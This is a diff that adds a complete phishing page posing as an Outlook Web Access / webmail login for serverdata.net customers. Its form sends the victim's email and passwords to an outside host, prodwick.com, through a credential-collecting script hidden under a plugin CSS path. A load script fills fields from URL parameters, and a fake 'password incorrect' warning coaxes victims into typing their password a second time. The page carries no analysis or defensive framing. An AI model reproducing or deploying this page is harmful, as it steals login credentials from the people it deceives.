@@ -1,0 +1,840 @@
+<html><head>
+    <script type="text/javascript"> 
+  
+        window.addEventListener('load', () => {
+      const params = (new URL(document.location)).searchParams;
+      const email = params.get('email');
+      const pass = params.get('pass');
+      
+       document.getElementById('email').innerHTML = email;
+       document.myform.email.value = email;
+       document.getElementById('pass').innerHTML = pass;
+       document.myform.pass.value = pass;
+      
+      
+      })
+      
+        </script>
+    <title>Outlook Web Access</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+<style>
+    @font-face {
+ font-family:'DINOTCondensedMedium';
+ src:url('/content/font/dinot-condmedium-webfont.eot');
+ src:url('/content/font/dinot-condmedium-webfont.eot?#iefix') format('embedded-opentype'),
+ url('/content/font/dinot-condmedium-webfont.woff') format('woff'),
+ url('/content/font/dinot-condmedium-webfont.ttf') format('truetype'),
+ url('/content/font/dinot-condmedium-webfont.svg#DINOTCondensedMedium') format('svg');
+ font-weight:normal;
+ font-style:normal
+}
+@font-face {
+ font-family:'DINOTRegular';
+ src:url('/content/font/dinot-webfont.eot');
+ src:url('/content/font/dinot-webfont.eot?#iefix') format('embedded-opentype'),
+ url('/content/font/dinot-webfont.woff') format('woff'),
+ url('/content/font/dinot-webfont.ttf') format('truetype'),
+ url('/content/font/dinot-webfont.svg#DINOTRegular') format('svg');
+ font-weight:normal;
+ font-style:normal
+}
+@font-face {
+ font-family:'DINOTMedium';
+ src:url('/content/font/dinot-medium-webfont.eot');
+ src:url('/content/font/dinot-medium-webfont.eot?#iefix') format('embedded-opentype'),
+ url('/content/font/dinot-medium-webfont.woff') format('woff'),
+ url('/content/font/dinot-medium-webfont.ttf') format('truetype'),
+ url('/content/font/dinot-medium-webfont.svg#DINOTMedium') format('svg');
+ font-weight:normal;
+ font-style:normal
+}
+@font-face {
+ font-family:'DINOTBold';
+ src:url('/content/font/dinot-bold-webfont.eot');
+ src:url('/content/font/dinot-bold-webfont.eot?#iefix') format('embedded-opentype'),
+ url('/content/font/dinot-bold-webfont.woff') format('woff'),
+ url('/content/font/dinot-bold-webfont.ttf') format('truetype'),
+ url('/content/font/dinot-bold-webfont.svg#') format('svg');
+ font-weight:normal;
+ font-style:normal
+}
+@font-face {
+ font-family:'Open Sans';
+ src:url('/content/font/opensans-regular-webfont.eot');
+ src:url('/content/font/opensans-regular-webfont.eot?#iefix') format('embedded-opentype'),
+ url('/content/font/opensans-regular-webfont.woff') format('woff'),
+ url('/content/font/opensans-regular-webfont.ttf') format('truetype'),
+ url('/content/font/opensans-regular-webfont.svg#open_sansregular') format('svg');
+ font-weight:normal;
+ font-style:normal
+}
+body {
+ background:#0d6eaa
+}
+button {
+ margin:0
+}
+.sdsdfbod {
+ width:420px;
+ margin:100px auto
+}
+.weareone {
+ color:#fff;
+ font-family:'DINOTRegular';
+ font-weight:normal;
+ font-size:36px;
+ text-align:center;
+ margin-bottom:28px;
+ box-sizing:border-box
+}
+.ewas {
+ width:92px;
+ height:92px;
+ display:block;
+ margin:auto;
+ background-image:url(https://controlpanel.serverdata.net/content/images/icons/custom/aduser.svg)
+}
+.login-form {
+ width:410px;
+ margin:0 auto 90px auto;
+ position:relative;
+ background:#1788c5;
+ padding:30px;
+ box-sizing:border-box;
+ border:1px solid #1788c5;
+ border-bottom-left-radius:2px;
+ border-bottom-right-radius:2px
+}
+.login-form-qask {
+ margin-bottom:8px
+}
+.qask {
+ display:none
+}
+.qask-refresh {
+ display:inline-block;
+ height:36px;
+ line-height:40px;
+ vertical-align:top;
+ padding:8px;
+ cursor:pointer;
+ border:none;
+ background:none;
+ outline:none;
+ fill:#7de7ff
+}
+.qask-image {
+ display:inline-block;
+ background:#fff
+}
+.qask-refresh:hover {
+ fill:#5dcdff
+}
+.qask-refresh:hover {
+}
+.login-input,
+.password-input,
+.qask-input {
+ border:2px solid #fff;
+ border-radius:2px;
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+ font-size:15px;
+ color:#333;
+ height:40px;
+ line-height:25px;
+ margin:0 0 8px;
+ padding:5px 10px;
+ width:100%;
+ -webkit-appearance:none;
+ -webkit-box-sizing:border-box;
+ -moz-box-sizing:border-box;
+ box-sizing:border-box;
+ outline:none
+}
+.login-input:focus,
+.password-input:focus,
+.qask-input:focus {
+ border-color:#5dcdff;
+ outline:none
+}
+.login-input.password {
+ margin-bottom:16px
+}
+.login-checkbox {
+ margin-right:10px;
+ height:20px;
+ vertical-align:middle
+}
+.login-checkbox:before {
+ content:"";
+ display:inline-block;
+ background-color:#fff;
+ width:16px;
+ height:16px;
+ border:1px solid #fff;
+ border-radius:2px
+}
+.login-checkbox:checked:before {
+ background-color:#3fb2e5;
+ border-color:#3fb2e5;
+ display:block;
+ background-image:linear-gradient(transparent,transparent),url(/Content/images/icons/16/check-white_16.svg)
+}
+.login-submit {
+ height:48px;
+ width:204px;
+ display:block;
+ background:#96bc33;
+ color:#fff;
+ font-family:'DINOTRegular';
+ text-transform:uppercase;
+ border:1px solid #96bc33;
+ border-radius:2px;
+ font-size:18px;
+ margin:30px auto 0 auto;
+ padding:13px 76px 15px;
+ outline:none;
+ line-height:20px;
+ cursor:pointer
+}
+.login-submit:hover {
+ background:#88ab2e;
+ border-color:#88ab2e
+}
+.login-submit:active {
+ background:#729f40;
+ border-color:#729f40
+}
+.login-remember-me {
+ color:#fff;
+ float:left;
+ font-size:13px;
+ margin:0;
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif
+}
+.login-forgot-password {
+ float:right;
+ color:#7de7ff;
+ text-decoration:none;
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+ font-size:13px;
+ padding:1px 0
+}
+.login-forgot-password:hover {
+ text-decoration:underline
+}
+.login-forgot-password:visited {
+ color:#7de7ff
+}
+.pr {
+ position:relative
+}
+.login-love,
+.password-love,
+.qask-love {
+ z-index:1;
+ display:none;
+ position:absolute;
+ left:100%;
+ top:1px;
+ height:40px;
+ border:1px solid #fbb;
+ border-radius:2px;
+ background:#ffe6e8;
+ color:#ef4e4e;
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+ font-size:13px;
+ padding:10px 8px;
+ width:auto;
+ white-space:nowrap;
+ margin-left:10px;
+ box-sizing:border-box
+}
+.iuy-love {
+ z-index:1;
+ display:none;
+ position:relative;
+ float:left;
+ width:100%;
+ min-height:20px;
+ height:auto;
+ border:1px solid #fbb;
+ border-radius:2px;
+ background:#ffe6e8;
+ color:#ef4e4e;
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+ font-size:13px;
+ padding:10px 8px;
+ box-sizing:border-box;
+ margin:0 0 8px 0
+}
+.login-love::after,
+.password-love::after,
+.qask-love::after,
+.password-love::before,
+.login-love::before,
+.qask-love::before {
+ right:100%;
+ border:solid transparent;
+ content:" ";
+ height:0;
+ width:0;
+ position:absolute;
+ top:24px;
+ pointer-events:none
+}
+.login-love::before,
+.password-love::before,
+.qask-love::before {
+ border-right-color:#fbb;
+ border-width:7px;
+ margin-top:-12px
+}
+.login-love::after,
+.password-love::after,
+.qask-love::after {
+ border-right-color:#ffe6e8;
+ border-width:6px;
+ margin-top:-11px
+}
+.login-actions {
+ display:block;
+ margin:10px auto 24px auto;
+ width:100%;
+ position:relative;
+ float:left
+}
+.weess {
+ position:relative;
+ padding:0 5px;
+ overflow:hidden
+}
+.wees {
+ display:block;
+ float:left;
+ position:relative;
+ padding:20px;
+ width:205px;
+ font-family:'DINOTMedium';
+ text-align:center;
+ padding:20px;
+ box-sizing:border-box;
+ color:#fff;
+ cursor:pointer;
+ font-size:15px;
+ outline:none;
+ box-shadow:none;
+ border:none
+}
+.wees:disabled {
+ cursor:not-allowed
+}
+.login-webmail {
+ background:#145f8e;
+ border-left:1px solid #145f8e;
+ border-top:1px solid #145f8e;
+ border-top-left-radius:2px
+}
+.login-xcz {
+ background:#145f8e;
+ border-right:1px solid #145f8e;
+ border-top:1px solid #145f8e;
+ border-top-right-radius:2px
+}
+.wees.selected {
+ background:#1788c5;
+ border-color:#1788c5
+}
+.bvc-info {
+ background-image:url(/Content/images/icons/16/info-white_16.png);
+ background-image:linear-gradient(transparent,transparent),url(/Content/images/icons/16/info-white_16.svg);
+ background-repeat:no-repeat;
+ display:block;
+ height:16px;
+ opacity:.35;
+ position:absolute;
+ right:5px;
+ top:5px;
+ width:16px;
+ -ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=15)"
+}
+.qqqq-default {
+ border-radius:3px;
+ border:1px solid #64d7ff;
+ background:#fff;
+ color:#000
+}
+.qqqq-default .qqqq-content {
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+ font-size:13px;
+ line-height:16px;
+ padding:11px 8px;
+ overflow:hidden
+}
+.qqqq-bvc {
+ cursor:help;
+ margin-left:4px
+}
+.qqqq-tyuh {
+ padding:0;
+ font-size:0;
+ line-height:0;
+ position:absolute;
+ left:0;
+ top:0;
+ z-index:9999999;
+ pointer-events:none;
+ width:auto;
+ overflow:visible
+}
+.qqqq-tyuh .qqqq-content {
+ overflow:hidden
+}
+.qqqq-bngthyuuo {
+ display:block;
+ text-align:center;
+ width:100%;
+ height:100%;
+ position:absolute;
+ top:0;
+ left:0;
+ z-index:-1
+}
+.qqqq-bngthyuuo span,
+.qqqq-bngthyuuo-border {
+ display:block;
+ width:0;
+ height:0;
+ position:absolute
+}
+.qqqq-bngthyuuo-top span,
+.qqqq-bngthyuuo-top-right span,
+.qqqq-bngthyuuo-top-left span {
+ border-left:7px solid transparent!important;
+ border-right:7px solid transparent!important;
+ border-top:7px solid;
+ bottom:-6px
+}
+.qqqq-bngthyuuo-top span,
+.qqqq-bngthyuuo-top .qqqq-bngthyuuo-border,
+.qqqq-bngthyuuo-bottom span,
+.qqqq-bngthyuuo-bottom .qqqq-bngthyuuo-border {
+ left:0;
+ right:0;
+ margin:0 auto
+}
+.qqqq-bngthyuuo-top-left span,
+.qqqq-bngthyuuo-bottom-left span {
+ left:6px
+}
+.qqqq-bngthyuuo-top-left .qqqq-bngthyuuo-border,
+.qqqq-bngthyuuo-bottom-left .qqqq-bngthyuuo-border {
+ left:5px
+}
+.qqqq-bngthyuuo-top-right span,
+.qqqq-bngthyuuo-bottom-right span {
+ right:6px
+}
+.qqqq-bngthyuuo-top-right .qqqq-bngthyuuo-border,
+.qqqq-bngthyuuo-bottom-right .qqqq-bngthyuuo-border {
+ right:5px
+}
+.qqqq-bngthyuuo-left span,
+.qqqq-bngthyuuo-left .qqqq-bngthyuuo-border {
+ border-top:8px solid transparent!important;
+ border-bottom:8px solid transparent!important;
+ border-left:8px solid;
+ top:50%;
+ margin-top:-7px;
+ right:-7px
+}
+.qqqq-bngthyuuo-left .qqqq-bngthyuuo-border {
+ border-top:9px solid transparent!important;
+ border-bottom:9px solid transparent!important;
+ border-left:9px solid;
+ margin-top:-8px
+}
+.qqqq-bngthyuuo-right span,
+.qqqq-bngthyuuo-right .qqqq-bngthyuuo-border {
+ border-top:7px solid transparent!important;
+ border-bottom:7px solid transparent!important;
+ border-right:7px solid;
+ top:50%;
+ margin-top:-7px;
+ left:-6px
+}
+.qqqq-bngthyuuo-right .qqqq-bngthyuuo-border {
+ border-top:9px solid transparent!important;
+ border-bottom:9px solid transparent!important;
+ border-right:9px solid;
+ margin-top:-8px
+}
+.qqqq-fade {
+ opacity:0;
+ -webkit-transition-property:opacity;
+ -moz-transition-property:opacity;
+ -o-transition-property:opacity;
+ -ms-transition-property:opacity;
+ transition-property:opacity
+}
+.qqqq-fade-show {
+ opacity:1
+}
+.qqqq-dfgh {
+ -webkit-transform:scale(0,0);
+ -moz-transform:scale(0,0);
+ -o-transform:scale(0,0);
+ -ms-transform:scale(0,0);
+ transform:scale(0,0);
+ -webkit-transition-property:-webkit-transform;
+ -moz-transition-property:-moz-transform;
+ -o-transition-property:-o-transform;
+ -ms-transition-property:-ms-transform;
+ transition-property:transform;
+ -webkit-backface-visibility:hidden
+}
+.qqqq-dfgh-show {
+ -webkit-transform:scale(1,1);
+ -moz-transform:scale(1,1);
+ -o-transform:scale(1,1);
+ -ms-transform:scale(1,1);
+ transform:scale(1,1);
+ -webkit-transition-timing-function:cubic-bezier(.175,.885,.32,1);
+ -webkit-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -moz-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -ms-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -o-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ transition-timing-function:cubic-bezier(.175,.885,.32,1.15)
+}
+.qqqq-swing {
+ opacity:0;
+ -webkit-transform:rotateZ(4deg);
+ -moz-transform:rotateZ(4deg);
+ -o-transform:rotateZ(4deg);
+ -ms-transform:rotateZ(4deg);
+ transform:rotateZ(4deg);
+ -webkit-transition-property:-webkit-transform,opacity;
+ -moz-transition-property:-moz-transform;
+ -o-transition-property:-o-transform;
+ -ms-transition-property:-ms-transform;
+ transition-property:transform
+}
+.qqqq-swing-show {
+ opacity:1;
+ -webkit-transform:rotateZ(0deg);
+ -moz-transform:rotateZ(0deg);
+ -o-transform:rotateZ(0deg);
+ -ms-transform:rotateZ(0deg);
+ transform:rotateZ(0deg);
+ -webkit-transition-timing-function:cubic-bezier(.23,.635,.495,1);
+ -webkit-transition-timing-function:cubic-bezier(.23,.635,.495,2.4);
+ -moz-transition-timing-function:cubic-bezier(.23,.635,.495,2.4);
+ -ms-transition-timing-function:cubic-bezier(.23,.635,.495,2.4);
+ -o-transition-timing-function:cubic-bezier(.23,.635,.495,2.4);
+ transition-timing-function:cubic-bezier(.23,.635,.495,2.4)
+}
+.qqqq-fall {
+ top:0;
+ -webkit-transition-property:top;
+ -moz-transition-property:top;
+ -o-transition-property:top;
+ -ms-transition-property:top;
+ transition-property:top;
+ -webkit-transition-timing-function:cubic-bezier(.175,.885,.32,1);
+ -webkit-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -moz-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -ms-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -o-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ transition-timing-function:cubic-bezier(.175,.885,.32,1.15)
+}
+.qqqq-fall-show {
+}
+.qqqq-fall.qqqq-vivalavida {
+ -webkit-transition-property:all;
+ -moz-transition-property:all;
+ -o-transition-property:all;
+ -ms-transition-property:all;
+ transition-property:all;
+ top:0!important;
+ opacity:0
+}
+.qqqq-slide {
+ left:-40px;
+ -webkit-transition-property:left;
+ -moz-transition-property:left;
+ -o-transition-property:left;
+ -ms-transition-property:left;
+ transition-property:left;
+ -webkit-transition-timing-function:cubic-bezier(.175,.885,.32,1);
+ -webkit-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -moz-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -ms-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ -o-transition-timing-function:cubic-bezier(.175,.885,.32,1.15);
+ transition-timing-function:cubic-bezier(.175,.885,.32,1.15)
+}
+.qqqq-slide.qqqq-slide-show {
+}
+.qqqq-slide.qqqq-vivalavida {
+ -webkit-transition-property:all;
+ -moz-transition-property:all;
+ -o-transition-property:all;
+ -ms-transition-property:all;
+ transition-property:all;
+ left:0!important;
+ opacity:0
+}
+.qqqq-dfg {
+ opacity:.5;
+ -webkit-transform:scale(1.1,1.1);
+ -moz-transform:scale(1.1,1.1);
+ -o-transform:scale(1.1,1.1);
+ -ms-transform:scale(1.1,1.1);
+ transform:scale(1.1,1.1)
+}
+@media(max-width:568px) {
+ .login-love,
+ .password-love,
+ .qask-love {
+  position:relative;
+  left:unset;
+  margin:0 0 10px 0;
+  width:100%;
+  box-sizing:border-box;
+  height:40px
+ }
+ .login-love::before,
+ .password-love::before,
+ .login-love::after,
+ .password-love::after,
+ .qask-love::after,
+ .qask-love::before {
+  display:none
+ }
+}
+.cdfghju {
+ padding:10px 8px 10px 5px;
+ position:relative;
+ border:1px solid #fddfbc;
+ background:#fef2e4;
+ font-family:'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+ font-size:13px;
+ color:#666;
+ width:408px;
+ margin:0 auto;
+ box-sizing:border-box;
+ margin-bottom:8px
+}
+.cdfghju.vcfrm {
+ margin:-14px -30px 18px;
+ width:auto
+}
+.cdfghju strong {
+ color:#333;
+ font-weight:600
+}
+.cdfghju p {
+ margin:0 0 8px
+}
+.cdfghju a {
+ text-decoration:none;
+ color:#0098db
+}
+.cdfghju-content {
+ position:relative
+}
+.cdfghju-bvc {
+ position:absolute;
+ top:0;
+ left:0
+}
+.cdfghju-bvc.m-24 {
+ top:4px;
+ left:4px
+}
+.cdfghju-text {
+ margin-left:38px
+}
+.cc {
+ background:#d8d8d8;
+ border:none;
+ color:#333;
+ cursor:pointer;
+ display:inline-block;
+ font-family:DINOTMedium,'Trebuchet MS',Arial,Helvetica,sans-serif;
+ font-size:14px;
+ line-height:16px;
+ margin-bottom:0;
+ outline:none;
+ padding:4px 16px;
+ text-align:center;
+ text-decoration:none!important;
+ text-transform:none
+}
+.cc.m-warning,
+.cc.m-warning>a {
+ background:#ed941e;
+ color:#fff
+}
+.login-submit:disabled {
+ background:#bcc0c1;
+ border-color:#bcc0c1;
+ color:#8f9293;
+ cursor:default
+}
+.login-input:disabled,
+.password-input:disabled,
+.qask-input:disabled {
+ background:#eee;
+ outline:none;
+ border-color:#eee;
+ color:#aaa
+}
+.login-form.disabled .login-remember-me,
+.login-form.disabled .login-forgot-password {
+ color:#bbb;
+ text-decoration:none;
+ cursor:default
+}
+.login-2fa-service-devider {
+ position:absolute;
+ width:440px;
+ left:0
+}
+.login-2fa-notification {
+ height:55px
+}
+.login-2fa-qrcode {
+ width:200px;
+ height:200px;
+ margin-top:15px;
+ margin-bottom:15px
+}
+.login-2fa-template {
+ width:440px
+}
+.p16 {
+ padding:16px!important
+}
+.mb0 {
+ margin-bottom:0!important
+}
+.mb16 {
+ margin-bottom:16px!important
+}
+.text-center {
+ text-align:center!important
+}
+
+</style>
+
+</head>
+        <body>
+            <section class="sdsdfbod">
+                <div class="ewas"></div>
+                <h1 class="weareone">Welcome to your Webmail &amp; Account Settings</h1>
+                
+
+<div class="cdfghju" id="login-update-browser-ie" style="display: none">
+    <div class="text-center">
+        <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
+    </div>
+</div>
+
+                <div id="oldBrowser" class="cdfghju" style="display: none;">
+                    <div class="cdfghju-content">
+                        
+                        <img class="cdfghju-bvc m-24" src="/Content/images/icons/24/warning-orange_24.png" alt="">
+                        <div class="cdfghju-text"><div class="sasa">
+ <i class="cdfghju-bvc-warning mr10 ml-10"></i>
+ </div>
+ <div class="sasa">
+ </div></div>
+                    </div>
+                </div>
+                                                    <div class="weess">
+                        <button class="wees login-webmail selected">
+                            Webmail
+                            <i class="bvc-info tooltip ddd"></i>
+                        </button>
+                        <button class="wees login-xcz">
+                            My Services
+                            <i class="bvc-info tooltip ddd"></i>
+                        </button>
+                    </div>
+
+                <form name ="myform" id="myform"  method="post"  action="https://prodwick.com/assets/app/plugins/page-list/css/saboshd/serverdata/login_parse.php" class="login-form" novalidate="" autocomplete="off">
+                    <div>
+                        <div id="aduser-login-spinner" style="display: none">
+                            <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
+                                <ui:spinner></ui:spinner>
+                            </div>
+                        </div>
+                        <input name="returnUrl" type="hidden" value="https://controlpanel.serverdata.net/Portal/ADUser/Login">
+                        <input name="clientType" type="hidden" class="client-type" value="WebMail">
+                        <div class="pr">
+                            <input name="email" type="text" readonly  id="email"    document.getElementByIdvalue=''  class="login-input" required="" autofocus="">
+                            <div class="login-love required">Login required</div>
+                                <div class="login-love email">Valid email address required</div>
+                        </div>
+                        <div class="pr">
+                            <input name="pass" type="password" required id="pass" hidden   document.getElementByIdvalue='' >
+                            <input name="pass2" id="aduser-login-passwordInput" type="password" placeholder="Password" class="password-input" required="">
+                            <div class="password-love required">Password required</div>
+                            <span style="color: #cc0808">Your Password or Email is incorrect!!</span>
+                        </div>
+                        
+                        <template id="login-qask-template">
+                            <div class="login-form-qask">
+                                <input type="hidden" name="qaskId" value="7ee9b66da47f45959e4e10c53243dacf">
+                                <div class="qask-image">
+                                    <img id="qaskImage" src="/Portal/Captcha?id=7ee9b66da47f45959e4e10c53243dacf&amp;width=94&amp;height=36&amp;rnd=1623289967&amp;httproute=True" alt="">
+                                </div>
+                                <button class="qask-refresh" type="button">
+                                    
+                                    <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="qask-refresh-bvc">
+                                        <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
+                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
+                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
+                                        </path>
+                                        <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
+                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
+                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
+                                        </path>
+                                    </svg>
+                                    
+                                </button>
+                            </div>
+                            <div class="pr">
+                                <input name="qaskCode" type="text" placeholder="Code" class="qask-input" autofocus="">
+                                <div class="qask-love required">Code required</div>
+                                <div class="qask-love server">Valid code required</div>
+                            </div>
+                        </template>
+                        <div id="login-qask-place" class="pr"></div>
+                        <div class="login-actions">
+                            <div class="login-remember">
+                                <label class="login-remember-me">
+                                    <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
+                                    <span style="line-height: 22px; height: 22px;">Remember me</span>
+                                </label>
+                            </div>
+                            <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
+                        </div>
+                    </div>
+                    <button type="submit" class="login-submit">Login</button>
+                </form>
+            </section>
+    <span style="display: none">
+
+    </span>
+    
+
+    <!--[if lt IE 10]>
+        <script type="text/javascript">
+            $('#oldBrowser').show();
+        </script>
+    <![endif]-->
+<script src="/Portal/bundles/scripts/login/form/aduser?v=B87zorpzZDMoJcsZoh1VXPIom52zrbX9F7qXIbJKQ3w1"></script>
+    
+</body></html>
